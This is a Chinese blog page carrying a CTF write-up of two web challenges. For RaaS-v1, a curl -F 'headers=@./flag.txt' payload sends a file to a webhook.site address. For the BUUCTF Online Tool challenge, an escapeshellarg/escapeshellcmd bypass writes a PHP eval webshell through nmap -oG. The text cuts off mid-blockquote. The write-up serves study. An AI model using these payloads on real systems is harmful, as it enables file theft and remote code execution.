@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Ex1Le23">
+
+
+
+
+
+<title>集训WriteUp-1 | Stuuupid&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+
+
+
+    <script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+
+<script>
+    function pjax_fancybox() {
+      $(".post-content").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+        var element = document.createElement("a"); // a 标签
+        $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+        $(element).attr("href", $(this).attr("src"));
+        // console.log($(this));
+        if ($(this).attr("data-original")) {
+          $(element).attr("href", $(this).attr("data-original"));
+        }
+        $(element).attr("data-fancybox", "images");
+        var caption = "";   // 描述信息
+        if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+          $(element).attr('data-caption', $(this).attr('alt'));
+          caption = $(this).attr('alt');
+        }
+        var div = document.createElement("div");
+        $(div).addClass("fancybox");
+        $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+        // var span = document.createElement("span");
+        // $(span).addClass("image-caption");
+        // $(span).text(caption); // 加描述
+        // $(this).after(span);  // 再套一层描述
+        $(this).wrap(element);  // 最后套 a 标签
+      })
+      $(".post-content").find("img").fancybox({
+        selector: '[data-fancybox="images"]',
+        hash: false,
+        loop: false,
+        closeClick: true,
+        helpers: {
+          overlay: {closeClick: true}
+        },
+        buttons: [
+          "zoom",
+          "close"
+        ]
+      });
+    };
+    $(function () {
+      pjax_fancybox();
+    });
+  </script>
+
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title ');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+
+       
+    }
+
+    function inputChange(e) {
+        const value = e.target.value;
+        const pc = $('#pc-search-input');
+        const mobile = $('#mobile-search-input');
+        const modalInput = $('#modal-form-input');
+        // 其中一个搜索框修改要更改另外两个搜索框
+        const inputArray = [pc, mobile, modalInput];
+        // modalInput.val("fuck")
+        for(let i = 0; i < inputArray.length; i++) {
+            if(e.target === inputArray[i][0]) {
+                continue;
+            }
+            inputArray[i].val(value);
+        }
+        
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json";
+        $(formEl).submit(function(e){
+            if(e && e.preventDefault){
+                e.preventDefault();
+            }else{
+                window.event.returnValue = false;
+            }
+            
+            const modalInput = $('#modal-form-input');
+         
+            if(!flag && modalInput.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+                $(".form-input").focus();
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            visibility: 'visible'
+                        });
+                    },
+                    success: function( datas ) {
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data) {
+                            var isMatch = true;
+                            var data_title = data.title && data.title.trim().toLowerCase() || 'Untitled';
+                            var data_content = data.content && data.content.trim().replace(/<[^>]+>/g, "").toLowerCase() || '';
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                            const loadingBar = $('.search-loading-bar') 
+                            loadingBar.css({
+                                visibility: 'hidden',
+                            });
+                        }, 300)
+                    }
+                });
+            })
+        
+        });
+    }
+    
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Stuuupid&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章，回车搜索" autocomplete="off" onchange="inputChange(event)" id="pc-search-input"/>
+        </form>
+    </div>
+
+
+
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div class="navbar-header-title">
+                    <a href="/">Stuuupid&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章，回车搜索" autocomplete="off" onchange="inputChange(event)" id="mobile-search-input"/>
+        </form>
+    </div>
+
+
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">集训WriteUp-1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Ex1Le23</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">January 4, 2023&nbsp;&nbsp;17:46:14</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Wp-web/">Wp-web</a>
+                            
+                        </span>
+                    
+                    
+                        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>2023-01-04 WP</p>
+<h1 id="T1-RaaS-v1"><a href="#T1-RaaS-v1" class="headerlink" title="T1 RaaS-v1"></a>T1 RaaS-v1</h1><p>题目提示<code>curl</code>和<code>read the docs</code>，并给出了二进制源码，用010 Editor或其他编辑器打开，得到如下源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if($_SERVER[&#x27;REMOTE_ADDR&#x27;] == &#x27;127.0.0.1&#x27;)&#123;     </span><br><span class="line">	die(&#x27;curl :thonk:&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = &#x27;http://localhost&#x27;;</span><br><span class="line">$method = &#x27;GET&#x27;;</span><br><span class="line">$formParams = [];</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;                        </span><br><span class="line">	$url = $_GET[&#x27;url&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;method&#x27;]))&#123;</span><br><span class="line">	$method = $_GET[&#x27;method&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;formParams&#x27;]))&#123;                 </span><br><span class="line">	$formParams = $_GET[&#x27;formParams&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = &#x27;curl &#x27;;</span><br><span class="line">$cmd .= &#x27;--proto -file &#x27;; </span><br><span class="line">$cmd .= escapeshellarg($url).&#x27; &#x27;;</span><br><span class="line">$cmd .= &#x27;-X &#x27;;</span><br><span class="line">$cmd .= escapeshellarg($method).&#x27; &#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($formParams as $key =&gt; $value)&#123;</span><br><span class="line">	if(preg_match(&quot;/^\w+$/&quot;,$key))&#123;</span><br><span class="line">		$cmd .= &#x27;-F &#x27;;</span><br><span class="line">		$cmd .= escapeshellarg($key.&#x27;= &#x27;.$value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: text/plain&#x27;);</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure>
+
+<p>并且在源码中可以发现<code>raas-v1/flag.txt</code>，猜测这题要我们利用<code>curl命令</code>读取文件，获取flag.</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>代码第一行的 <code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 能获取<strong>正在浏览当前页面用户的 IP 地址</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($_SERVER[&#x27;REMOTE_ADDR&#x27;] == &#x27;127.0.0.1&#x27;)&#123;     </span><br><span class="line">	die(&#x27;curl :thonk:&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>规定了不能用本地访问该页面。这一点容易解决，只需要传入URL参数，不让他自己curl连接自己就好。<br>接下来是几个参数的提交，最终会被拼接为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = curl --proto -file $url -X $method -F $key= $value</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>$url</code> <code>$method</code> <code>$key.&#39;= &#39;.$value</code> 都会由<code>escapeshellarg()</code>处理。</p>
+<blockquote>
+<p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。</p>
+</blockquote>
+<p>花了很长时间研究<code>escapeshellarg()</code>的绕过，并试图利用在这道题上，遗憾的是没有成功。转而进一步查阅curl手册，找到<code>-F</code>选项:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-F, --form CONTENT  模拟 HTTP 表单数据提交（multipart POST）</span><br></pre></td></tr></table></figure>
+
+<p>该选项可以用来提交表单数据、上传二进制文件等，其用法如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">示例1 将图像发送到HTTP服务器，其中“profile”是文件portrait.jpg将作为输入的表单字段的名称：</span><br><span class="line">curl -F profile=@portrait.jpg https://example.com/upload.cgi</span><br><span class="line"></span><br><span class="line">示例2 将您的姓名和鞋码发送到两个文本字段到服务器：</span><br><span class="line">curl -F name=John -F shoesize=11 https://example.com/</span><br><span class="line"></span><br><span class="line">示例3 将文本字段中的文章发送到服务器。将其作为纯文本字段发送，但从本地文件中获取其内容：</span><br><span class="line">curl -F &quot;story=&lt;hugefile.txt&quot; https://example.com/</span><br><span class="line"></span><br><span class="line">您可以通过设置 headers= 向字段添加自定义标题，例如：</span><br><span class="line"> curl -F &quot;submit=OK;headers=\&quot;X-submit-type: OK\&quot;&quot; example.com</span><br><span class="line"> 或</span><br><span class="line"> curl -F &quot;submit=OK;headers=@headerfile&quot; example.com</span><br></pre></td></tr></table></figure>
+
+<p>接下来回到<code>$cmd = curl --proto -file $url -X $method -F $key= $value</code>，这里<code>--proto -file</code>关闭了<code>file</code>协议，也就无法通过file协议去访问文件。不过没有关系，<code>-F</code>选项告诉我们可以通过<code>curl -F 参数名=&lt;文件名</code>上传文件内容到服务器（或者<code>@文件名</code>上传文件）。而在这里，这个办法也是行不通的，因为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd .= escapeshellarg($key.&#x27;= &#x27;.$value);</span><br></pre></td></tr></table></figure>
+<p>强行在 <code>=</code> 和 <code>$value</code> 之间加了个空格。于是选择利用上述给到的最后一个<code>-F</code>选项的用例，通过<code>headers</code>参数将文件内容提交到vps，然后在vps监听即可（不知为何我的vps始终监听不到，烦捏）。</p>
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>最终payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cmd = curl --proto -file &quot;https://webhook.site/949a9a7a-852c-49ae-bf21-c0406b092ecf&quot; -X &quot;GET&quot; -F &quot;file= a;headers=@./flag.txt&quot;</span><br><span class="line"></span><br><span class="line">url=https://webhook.site/949a9a7a-852c-49ae-bf21-c0406b092ecf&amp;method=GET&amp;formParams[file]=a;headers=@./flag.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考丹子哥的wp: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ccuu/articles/17023814.html">一个curl的绕过</a><br><br>参考curl手册: <a target="_blank" rel="noopener" href="https://curl.se/docs/manpage.html">curl.se</a><br><br>参考小姿势: <a target="_blank" rel="noopener" href="https://www.77169.net/html/196478.html">绕过限制利用curl读取写入文件</a></p>
+</blockquote>
+<h1 id="T2-BUUCTF-2018-Online-Tool"><a href="#T2-BUUCTF-2018-Online-Tool" class="headerlink" title="T2 [BUUCTF 2018]Online Tool"></a>T2 [BUUCTF 2018]Online Tool</h1><p>为了针对<code>escapeshellarg()</code>函数的绕过进行学习，这里直接嫖一道相关的题来分析。源码直接给出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);                      // @为错误控制运算符，附加到表达式前面时，任何可能出现的由该表达式生成的诊断错误将被抑制</span><br><span class="line">    chdir($sandbox);                       // 改变当前的目录为上一步创建的$sandbox</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p><code>$host</code>是可控的，依次经过<code>escapeshellarg</code>和<code>escapeshellcmd</code>处理，然后拼接到nmap语句中，猜想可以利用<code>nmap</code>语法实现RCE. 查询Nmap手册，先对源码中nmap语句进行解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F </span><br><span class="line"></span><br><span class="line">-T5: 即Insane模式，适合快速的网络或者不在意丢失默些信息,对每台主机的超时限制为75秒,对每次探测只等待0.3秒</span><br><span class="line">-sT: TCP连接扫描</span><br><span class="line">-Pn: 无Ping扫描,可以躲避防火墙防护,可以在目标主机禁止ping的情况下使用</span><br><span class="line">-F : 快速扫描</span><br></pre></td></tr></table></figure>
+
+<p>没有发现什么可利用的点，但可查知nmap可以将输出结果写入文件，文件名和文件类型均可自定义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap的格式化输出</span><br><span class="line"> 保存为TXT      nmap -oN + txt保存路径 + 目标</span><br><span class="line"> 保存为XML      nmap -oX + 路径 + 目标</span><br><span class="line"> 保存为Grep     nmap -oG + 路径 + 目标</span><br><span class="line"> 保存为所有格式  nmap -oA  //扫描结果以标准格式、XML格式和Grep格式一次性保存，分别存放在&lt;名字&gt;.nmap，&lt;名字&gt;.xml和&lt;名字&gt;.gnmap中</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们对上述命令进行测试，发现<code>nmap -oN</code>能够将结果连同整条nmap命令一起写入测试文件中</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/nmaptest.png" class="" title="nmap测试">
+
+<p>利用这一点，我们在nmap语句中插入<strong>一句话木马</strong>，尝试实现木马文件的上传</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/shell.png" class="" title="nmap传马">
+
+<p>值得注意的是，一句话木马的插入必须要用<code>&#39;&#39;</code>引起来，否则会导致nmap语句无法执行，写入失败。</p>
+<p>确定了上传webshell的方向，下面考虑<code>escapeshellarg</code>和<code>escapeshellcmd</code>处理的绕过。在上面我们了解到</p>
+<blockquote>
+<p><code>escapeshellarg</code> — 把字符串转码为可以在 shell 命令里使用的参数<br><br><br>功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)<br><br><br>定义 ：<code>string escapeshellarg ( string $arg )</code></p>
+</blockquote>
+<p>简单来说，<code>escapeshellarg</code>是为了防止用户利用shell的一些技巧（如分号、反引号等），执行其他命令。</p>
+<blockquote>
+<p><code>escapeshellcmd</code> — shell 元字符转义<br><br><br>功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。<br><br><br>反斜线（\）会在以下字符之前插入： &amp;#;反引号|?~&lt;&gt;^()[]{}$<em>, \x0A 和 \xFF</em>。 *’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。<br><br><br>定义 ：<code>string escapeshellcmd ( string $command)</code></p>
+</blockquote>
+<p>而<code>escapeshellcmd</code>则是为了防止用户的输入逃逸出“参数值”的位置，变成一个“参数选项”。</p>
+<p>我们在Linux环境下，对<code>127.0.0.1&#39; a b</code>进行测试</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/p.png" class="" title="示例">
+
+<p>可以得到其处理的过程：</p>
+<ul>
+<li>经过<code>escapeshellarg</code>处理，先对中间没有配对的单引号转义，变成<code>\&#39;</code>，再用两对单引号，分别将左右两部分括起来，从而起到连接作用，变成<code>&#39;127.0.0.1&#39;\&#39;&#39; a b&#39;</code></li>
+<li>经过<code>escapeshellcmd</code>处理，其处理时会对<code>\</code>进行转义，变成<code>\\</code>，而最后<code>b&#39;</code>的单引号被视为<strong>没有配对</strong>，因而也被转义，最后变成<code>&#39;127.0.0.1&#39;\\&#39;&#39; a b\&#39;</code></li>
+<li>最后若当作命令执行，由于中间的<code>\\</code>被解释为字符<code>\</code>而不再具有转义作用，所以后面的<code>&#39;</code>没有被转义，而是与<code> a</code>前面的<code>&#39;</code>配对成了一个<strong>空白连接符</strong>。最终在命令中可以简化为<code>127.0.0.1\ a b&#39;</code></li>
+</ul>
+<h2 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h2><p> 那么根据我们最终希望构造出的命令，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&lt;?php @eval($_POST[a]);?&gt;&#x27; -oG webshell.php</span><br><span class="line"></span><br><span class="line">?host=&#x27;&lt;?php @eval($_POST[a]);?&gt; -oG webshell.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>上传成功会显示sandbox值，也就是webshell.php所在的文件夹名，直接用蚁剑连接，发现连接失败，我们再来分析我们上传的<code>$host</code>:</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/wrong.png" class="" title="分析">
+
+<p>可以看到最后的命令中，webshell.php后面还带有两个反斜杠<code>\\</code>，其余的引号都被配对成了空白连接符，所以最后写入的文件就变成了<code>webshell.php\\</code>。这里只需要在最后的引号前添加一个空格，使<code>php</code>与<code>\\</code>分开即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27;&lt;?php @eval($_POST[a]);?&gt; -oG webshell.php &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>最后蚁剑成功连接，找到flag。其中找到的<code>webshell.php\\</code>也证实了我们上一步的分析。</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/ant.png" class="" title="蚁剑">
+
+<blockquote>
